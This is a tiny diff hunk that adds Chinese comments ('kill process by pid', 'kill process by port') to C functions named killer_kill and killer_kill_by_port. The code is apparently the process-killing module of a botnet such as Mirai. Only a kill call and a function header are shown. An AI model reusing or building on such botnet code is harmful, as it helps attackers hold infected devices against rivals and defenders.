@@ -245,11 +245,13 @@ void killer_init(void)
 #endif
 }
 
+/*根据pid杀掉进程*/
 void killer_kill(void)
 {
     kill(killer_pid, 9);
 }
 
+/*根据端口杀掉进程*/
 BOOL killer_kill_by_port(port_t port)
 {
     DIR *dir, *fd_dir;
